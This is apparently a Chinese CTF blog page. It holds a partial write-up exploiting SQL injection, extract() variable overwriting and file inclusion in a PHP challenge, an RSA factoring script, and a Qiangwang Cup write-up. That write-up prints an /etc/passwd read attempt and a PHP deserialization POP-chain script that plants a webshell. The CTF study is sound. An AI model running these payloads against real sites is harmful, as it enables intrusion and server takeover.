<p>主要逻辑就是注册功能，先从数据库查找一下有没有注册的账户名密码，没有的话插入数据库完成注册</p>
<p><strong>index.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($tem))&#123;</span><br><span class="line">        <span class="keyword">require</span>(<span class="string">"template/$tem.php"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">require</span>(<span class="string">"template/index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;$_POST[<span class="string">'password'</span>])&#123;</span><br><span class="line">        $sql_ = <span class="string">"select * from users where username='$username' and password='$password'"</span>;</span><br><span class="line">        $db = <span class="keyword">new</span> sql();</span><br><span class="line">        $row = $db-&gt;getone($sql_);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($row))&#123;</span><br><span class="line">            session_start();</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line">            header(<span class="string">"Location: info.php"</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>程序逻辑就是看有无<code>post</code>这个用户，有的话跳转到<code>info.php</code>页面，这个程序是存在一些漏洞的，<strong>如果可控制$tem参数，则可造成任意文件包含。</strong></p>
<p><strong>info.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">    $sql_ = <span class="string">"select * from users where username='$username'"</span>;</span><br><span class="line">    $db = <span class="keyword">new</span> sql();</span><br><span class="line">    $row = $db-&gt;getone($sql_);</span><br><span class="line">    $username = $row[<span class="string">'username'</span>];</span><br><span class="line">    $role = $row[<span class="string">'role'</span>];</span><br><span class="line">    $sql_ = <span class="string">"select info from info where role='$role'"</span>;</span><br><span class="line">    $row = $db-&gt;getone($sql_);</span><br><span class="line">    $info = $row[<span class="string">'info'</span>];</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">"template/info.php"</span>);</span><br></pre></td></tr></table></figure>

<p>通过数据库查询语句回显信息的文件</p>
<p><strong>edit_info.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    extract($_GET);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($role))&#123;</span><br><span class="line">        $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">        $role = addslashes($role);</span><br><span class="line">        $sql_ = <span class="string">"update users set role=$role where username='$username'"</span>;</span><br><span class="line">        $db = <span class="keyword">new</span> sql();</span><br><span class="line">        $db-&gt;register($sql_);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里文件功能为更新用户信息，漏洞点在于extract处，产生变量覆盖。</p>
<h4 id="攻击点思考"><a href="#攻击点思考" class="headerlink" title="攻击点思考"></a>攻击点思考</h4><p>在edit_info.php中进行变量覆盖$role值，$role值覆盖为注入语句的十六进制值，绕过<code>is_numeric($role)</code>,update的语句会将十六进制值转化为对应的字符串，进而在info.php中<code>$sql_ = &quot;select info from info where role=&#39;$role&#39;&quot;</code>产生注入，得到值。</p>
<p>但是这里存在一个问题如果我们在edit_info.php中直接传入role值去覆盖，则不会产生覆盖的结果，原因如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"config.php"</span>);</span><br></pre></td></tr></table></figure>
<p>可以看到这个代码的执行顺序，先进行变量覆盖，再进行文件包含，在<code>common.php</code>中给<code>$role</code>赋值为1，所以我们的十六进制注入语句不会生效。接下来寻找一下绕过点，发现在<code>index.php</code>中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($tem))&#123;</span><br><span class="line"> <span class="keyword">require</span>(<span class="string">"template/$tem.php"</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="keyword">require</span>(<span class="string">"template/index.php"</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>这个就是我们之前提起的有文件包含漏洞的文件，如果我们去包含一下<code>edit_info.php</code>,执行顺序则变成了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="comment">//包含进来的文件</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"config.php"</span>);</span><br></pre></td></tr></table></figure>

<p><code>require_once</code>函数只能进行包含一次文件，所以我们实际上执行语句如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="comment">//包含进来的文件</span></span><br><span class="line">extract($_GET);</span><br></pre></td></tr></table></figure>

<p>即成功进行变量覆盖，绕过了$role=1的限制。然后将我们构造好的注入语句转化为16进制，update将16进制数据转化为字符串，最终在<code>info.php</code>中<code>select info from info where role=&#39;$role&#39;&quot;</code>中产生注入数据，得到flag。</p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p><strong>Crypto1</strong></p>
<p>已经e,d,n,求p,q,脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">from</span> md5 <span class="keyword">import</span> md5   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span>  </span><br><span class="line">   <span class="keyword">if</span> a &lt; b:  </span><br><span class="line">     a, b = b, a  </span><br><span class="line">   <span class="keyword">while</span> b != <span class="number">0</span>:  </span><br><span class="line">     temp = a % b  </span><br><span class="line">     a = b  </span><br><span class="line">     b = temp  </span><br><span class="line">   <span class="keyword">return</span> a    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpq</span><span class="params">(n,e,d)</span>:</span>  </span><br><span class="line">    p = <span class="number">1</span>  </span><br><span class="line">    q = <span class="number">1</span>  </span><br><span class="line">    <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span>:  </span><br><span class="line">        k = d * e - <span class="number">1</span>  </span><br><span class="line">        g = random.randint ( <span class="number">0</span> , n )  </span><br><span class="line">        <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span> <span class="keyword">and</span> k % <span class="number">2</span> == <span class="number">0</span>:  </span><br><span class="line">            k /= <span class="number">2</span>  </span><br><span class="line">            y = pow(g,k,n)  </span><br><span class="line">            <span class="keyword">if</span> y!=<span class="number">1</span> <span class="keyword">and</span> gcd(y<span class="number">-1</span>,n)&gt;<span class="number">1</span>:  </span><br><span class="line">                p = gcd(y<span class="number">-1</span>,n)  </span><br><span class="line">                q = n/p  </span><br><span class="line">    <span class="keyword">return</span> p,q    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>  </span><br><span class="line">    n =<span class="number">0x8189919220df44ed66be4e916c99d8c34b81acaa20427d9f34bcf137d6fba2b3d58bccdc2aa579d4ad29edf43c2a82f949a62ea625e1bf347a39a5082fb4dae1f96761b0d300bbd721756661413d1bad777ee2e1398809c902738b3edd52a8cf290cd3925b3db19822947fa3e117bca67f0240c03436ea0f1506147f65aae7eb5b8681fe209edb895ebfd4c79d12198c139508d1d0ab191f45c169f3f6da1429e6de4149ec4e90ae5c4746fc01c69f300464b9e91553de43d045c060c93ab538fd430f34ad4c930bfb6c52a03b6f8dfe75953ece44837e5ec4d39bf93e4f6282c2d8865a7fb04a8371249eba1cd55be10a7db12b673d9fb1ff619ad25dbaec65</span></span><br><span class="line">    e =<span class="number">0x10001</span></span><br><span class="line">    d =<span class="number">0x4aefe3a7ce9e7b087f8c8e7530875bcfb6e9a09296b1006d4e9c134bc371b53125d38742c2e511b2c82e5e7b112762b78634bdfdde225773ab5597b441acf5870eba10d8b36854426317c08f78a73a50c2b543d919682a88ff830a45e6d17fd8c01dac739996fa1b51bde88d4c9567cc45e36ec40230d67cbd23d44dd2e9e8d9fb1714050630f394d07de6688d0e37678267d0080c442b61ce608bb9057aa5907be6862ab1e57b0644d6ec2f602040ddcd9643e49999248fd3872dc4e496d74bebee1029c8cfa498e1b4f4f5c9cf3660f2776c72a3876a61b9544ac53fcf35fedf1a1c8f3027331b22e88c395c697a1436f1dcb8e9f91cf106a993ea69d7dead</span></span><br><span class="line">    p,q = getpq(n,e,d)  </span><br><span class="line">    <span class="comment">#print "p: "+hex(p)</span></span><br><span class="line">    <span class="comment">#print "q: "+hex(q) </span></span><br><span class="line">c=<span class="number">0xbf601e007a3d5e7b6935018e7d434d416ee444b34cf965466bc8c5e41f05523f076d413a183b6a36265933d4d47c095f2261be78ee04c5ba1da24e68817b25386a4facda9187a3b934e38143f03ba7f3fd113e34befbe2b7fc94e875ee7ac5ed85763f6a870fa8acfcd2d39aa88b2276d94e6aa54c596a60e10569af948d106f</span></span><br><span class="line">d=<span class="number">0xad47b81df70b41a2c785414f430cb4ee32e7c0fe6b3201608dd7eb2572f7aaa5edbe23590e83c933a457a224fe6b5c6697819c91b58c454762025a814f1de9c693b503368d103178db40688bd853690a8d86bb190bb44f10e210cc643a21dbfad21c35f40d313e955782731b73dd9a7b31bb288d48e87f1e5b82fae19656d26b</span></span><br><span class="line"><span class="keyword">print</span> md5(str(c+d)).hexdigest()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:  </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>解得<code>flag:e7ddad281ff7dfc99eb3379e0efd46f8</code></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/02/2019-%E5%AE%89%E6%81%925%E6%9C%88%E8%B5%9B%E9%83%A8%E5%88%86wp/" data-id="ckabsu37i0002kkvrfgnfgrpl" class="article-share-link" data-share="baidu" data-title="2019 安恒5月赛部分wp">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/02/2019-%E5%AE%89%E6%81%925%E6%9C%88%E8%B5%9B%E9%83%A8%E5%88%86wp/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-由一道题引发对CTF思维的思考" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/01/%E7%94%B1%E4%B8%80%E9%81%93%E9%A2%98%E5%BC%95%E5%8F%91%E5%AF%B9CTF%E6%80%9D%E7%BB%B4%E7%9A%84%E6%80%9D%E8%80%83/" class="article-date">
  <time datetime="2019-06-01T08:59:44.000Z" itemprop="datePublished">2019-06-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/01/%E7%94%B1%E4%B8%80%E9%81%93%E9%A2%98%E5%BC%95%E5%8F%91%E5%AF%B9CTF%E6%80%9D%E7%BB%B4%E7%9A%84%E6%80%9D%E8%80%83/">由一道题引发对CTF思维的思考</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>利用一些时间做了强网杯,首先入手的就是<strong>upload</strong>这道题了，引发了自己的一些思考，下面来谈一下，并且总结一下自己做这道题的一些思路</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>题目复现链接:<br><a href="http://web17.buuoj.cn/" target="_blank" rel="noopener">http://web17.buuoj.cn/</a></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3k9mehfx2j31540mw7bu.jpg" alt="img"></p>
<p><strong>功能:注册，登陆，上传文件</strong></p>
<p><strong>思路一:</strong> 上传php文件进行<strong>getshell</strong>，其实这道题我是有扫过源码泄露的，但是可能因为工具不够强，并没有扫出<code>www.tar.gz</code>，所以我的第一思路还是直接去通过上传文件去<strong>getshell</strong>。</p>
<p>在上传文件的过程中推断后台的逻辑大概应该是用了<code>getimagesize</code>这样的函数对文件头进行检查，虽然自己的php文件绕过文件头检测成功上传到了，但是去<strong>upload目录下一看，变成了md5值加png后缀</strong>，<strong>其实在这个点困扰了一段时间，在纠结到底有没有可以突破附加png后缀的点</strong>，后来这部分的思路就放弃了，因为实在是不行</p>
<p><strong>不过通过思路一大概也可以推测出后台的逻辑代码:对上传后的文件，进行赋予一个随机md5值，并且添加上png后缀。</strong></p>
<p><strong>思路二</strong>:一开始看到题目发现大大的<strong>discuz与thinkphp</strong>，就有一些想法通过目前爆出来的漏洞去getshell，<strong>正巧我们有已经上传上去的恶意图片马，所以我们现在只需要找到一个thinkphp/discuz任意文件包含漏洞，即可getshell</strong>。</p>
<p>然后就是开启了疯狂google之旅，发现了一个这样的漏洞，<br><a href="http://www.moonsec.com/post-833.html" target="_blank" rel="noopener">http://www.moonsec.com/post-833.html</a> 尝试了一波，发现无果。</p>
<p><strong>思路三</strong>：其实每个思路的间隔时间差挺大，因为周末有物理实验和实验报告，并没有太多的时间去连续思索，在上面的<strong>思路二</strong>中，其实当时已经陷入了僵局，做完实验回来一看..70多个队伍做出来了，有点慌，后来队友和我说这里的<strong>user处的base64编码是存在反序列化的</strong>，我去看了一下，确实是这样(自己的信息搜集真实不到位Orz),解出来了如下一套数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:5:&#123;s:2:&quot;ID&quot;;i:3;s:8:&quot;username&quot;;s:7:&quot;huaiqiu&quot;;s:5:&quot;email&quot;;s:16:&quot;lihuaiqiu@qq.com&quot;;s:8:&quot;password&quot;;s:32:&quot;698d51a19d8a121ce581499d7b701668&quot;;s:3:&quot;img&quot;;s:79:&quot;..&#x2F;upload&#x2F;bc9c0f21801e3928b868149bfb65e408&#x2F;cd3d1cc6e477b590d1b89a6ee805808e.png&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>看到反序列化数据首先尝试了一下任意文件读取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:5:&#123;s:2:&quot;ID&quot;;i:4;s:8:&quot;username&quot;;s:7:&quot;huaiqiu&quot;;s:5:&quot;email&quot;;s:7:&quot;huaiqiu@qq.com&quot;;s:8:&quot;password&quot;;s:32:&quot;698d51a19d8a121ce581499d7b701668&quot;;s:3:&quot;img&quot;;s:19:&quot;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>发现不太行,这里其实对源码泄露又产生了一些疑惑，<strong>不能任意文件读取，还有有类的源码泄露，怎么构造反序列化….</strong>，抱着怀疑的态度又去试了一下源码泄露扫描，还是无果..，不禁思考..<strong>难道真的是硬刚反序列化吗</strong>…..</p>
<p>然后思考着三个矛盾点:</p>
<p>1.<strong>如果是真的反序列化，那么硬刚反序列化的目的肯定是要在img部分去解析我们上传的图片马，并且一定是要以php方式进行解析，但是上传的文件都被修改为了png格式，这里就很矛盾。</strong></p>
<p>2.<strong>如果是某种我不知道的姿势去成功上传php文件getshell，那么这道题的user处的反序列化数据就没有用到，很明显，直接上传php文件getshell是个错误的思路。</strong></p>
<p>3.<strong>我在之前的思路二中有提及到一个问题，就是用框架的任意文件包含漏洞，去getshell，很明显..这同样不涉及反序列化数据，所以这个思路肯定是pass掉的</strong></p>
<p>所以当时思路几乎是莫得了，后来在临近比赛结束一个小时左右发现真的是有源码泄露..Orz，最后也没有做出来..(可以说是十分自闭了</p>
<h3 id="题目复盘"><a href="#题目复盘" class="headerlink" title="题目复盘"></a>题目复盘</h3><p>赛后进行了一波复现，复现过程如下:</p>
<p>主要后台逻辑文件共有<code>Register.php,login.php,Profile.php.Index.php</code>这四个文件</p>
<p>先理清一下文件的代码逻辑</p>
<p>register的函数逻辑</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbaxb9o7j31350hwtaz.jpg" alt="img"></p>
<p>首先调用__construct进行new Index(),从Index中调用login_check进行登陆检测，login_check函数代码如下：</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbdsms7hj30u40ajdge.jpg" alt="img"></p>
<p>可以看到函数逻辑为将目前<strong>User处的反序列化数据与数据库中的进行对比，如果不同则直接返回0</strong>，这里就是我们要利用的一个点——–<strong>unserialize</strong></p>
<p>接着去找一下所有文件中危险魔术方法操作</p>
<p><strong>register处的__construct</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbkopahoj30rm0fbt9p.jpg" alt="img"></p>
<p><strong>register处destruct</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbgnza1jj30gt075mx5.jpg" alt="img"></p>
<p><strong>Profile中的<strong>call与</strong>get方法</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbin6dtvj30ju0cyweq.jpg" alt="img"></p>
<p><strong>这四个魔术方法足以形成一个pop链，去调用任意函数方法</strong>，解析如下:</p>
<p><strong>当<strong>destruct中的$this-&gt;checker指向的index方法如果在$this-&gt;checker这个类不存在的话，那么就会触发</strong>call方法，在<strong>call方法中逻辑:调用$this-&gt;{$name}，但是如果此类中仍然不存在$this-&gt;${name}变量的话,那么就会再一次触发</strong>get魔术方法，去返回expect数组中对应调用此$this-&gt;name的值，然后__call再次去调用expect数组中对应的值，所以只要我们构造好expect数组中index对应值，就可以实现执行任意方法的操作，将值写成方法的名字，便可调用任意方法。</strong></p>
<p>这里还要说明一点:为什么这个反序列化数据看起来的作用域是所有类的，看到所有类中是基本都有一个<strong>login_check</strong>函数的，所以反序列化的数据对应的作用域即是所有类，所以可以进行构造反序列化自由调用。</p>
<h4 id="既然可以执行任意方法函数了，下面来找一下危险函数方法"><a href="#既然可以执行任意方法函数了，下面来找一下危险函数方法" class="headerlink" title="既然可以执行任意方法函数了，下面来找一下危险函数方法"></a>既然可以执行任意方法函数了，下面来找一下危险函数方法</h4><p>在Profile类中存在<strong>upload-img危险函数</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbwpsd9kj30wx0ke765.jpg" alt="img"></p>
<p>可以看到有一个<strong>危险操作copy函数，如果我们控制了filename与filename_tmp就可以成功生成自己的webshell了</strong></p>
<p>这里在upload_img函数中有几个点需要去绕过一下：</p>
<ul>
<li>login_check函数：在反序列化时通过this-&gt;checker实例化Index类进行login_check调用检查，这里比较好绕过，<strong>可以不用管$this-&gt;checker(因为反序列化不会去调用__construct方法，还可以将$this&gt;checker赋值为0或者false,都可以实现绕过。</strong></li>
<li>第二个if，反序列化的时候不上传文件即可绕过。</li>
<li>第三个，就是之前所说的文件头伪造绕过的</li>
<li>赋值<strong>$this-&gt;ext为1</strong>,进入copy函数生成图片马</li>
</ul>
<p>下面为逻辑图</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kd2tuaeyj30t60dsdh6.jpg" alt="img"></p>
<p>这样我们就可以很轻松的写出反序列化构造代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line">class Register</span><br><span class="line">&#123;</span><br><span class="line">    public $registed&#x3D;0;</span><br><span class="line">    public $checker;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;checker&#x3D;new Profile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Profile</span><br><span class="line">&#123;</span><br><span class="line">    public $except&#x3D;array(&#39;index&#39;&#x3D;&gt;&#39;upload_img&#39;);</span><br><span class="line">    public $filename_tmp&#x3D;&#39;..&#x2F;public&#x2F;upload&#x2F;bc9c0f21801e3928b868149bfb65e408&#x2F;cd3d1cc6e477b590d1b89a6ee805808e.png&#39;;</span><br><span class="line">    public $filename&#x3D;&#39;..&#x2F;public&#x2F;upload&#x2F;lihuaiqiu.php&#39;;</span><br><span class="line">    public $ext&#x3D;1;</span><br><span class="line">&#125;</span><br><span class="line">$v&#x3D;new Register();</span><br><span class="line">echo base64_encode(serialize($v));</span><br></pre></td></tr></table></figure>

<p>将生成的base64编码放进cookie中，得到webshell</p>
<p><a href="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kdbu25hrj31590fnabf.jpg" target="_blank" rel="noopener">https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kdbu25hrj31590fnabf.jpg</a></p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>通过这道题我们可以清楚，一道web的题的思路是多样化的，可能每一个点都有着对应着知识点与解题思路，同时也要注意做题前的信息搜集，比如注意源码泄露，以及cookie中或者返回的respone中所带有的信息，或者robots.txt等敏感文件，进而对各种点尝试不同的分析尝试思考，最终解题。</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/01/%E7%94%B1%E4%B8%80%E9%81%93%E9%A2%98%E5%BC%95%E5%8F%91%E5%AF%B9CTF%E6%80%9D%E7%BB%B4%E7%9A%84%E6%80%9D%E8%80%83/" data-id="ckabsu39b0042kkvr0f0ydivl" class="article-share-link" data-share="baidu" data-title="由一道题引发对CTF思维的思考">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/01/%E7%94%B1%E4%B8%80%E9%81%93%E9%A2%98%E5%BC%95%E5%8F%91%E5%AF%B9CTF%E6%80%9D%E7%BB%B4%E7%9A%84%E6%80%9D%E8%80%83/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <a class="extend prev" rel="prev" href="/page/5/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/7/">Next &amp;raquo;</a>
  </nav>
</section>
      
      <aside id="sidebar">
  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">30</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag">WEB安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a><span class="tag-list-count">26</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" rel="tag">生活随笔</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a><span class="tag-list-count">1</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 12.5px;">Crypto</a> <a href="/tags/WEB%E5%AE%89%E5%85%A8/" style="font-size: 10px;">WEB安全</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 17.5px;">Web安全</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">生活随笔</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">随笔</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
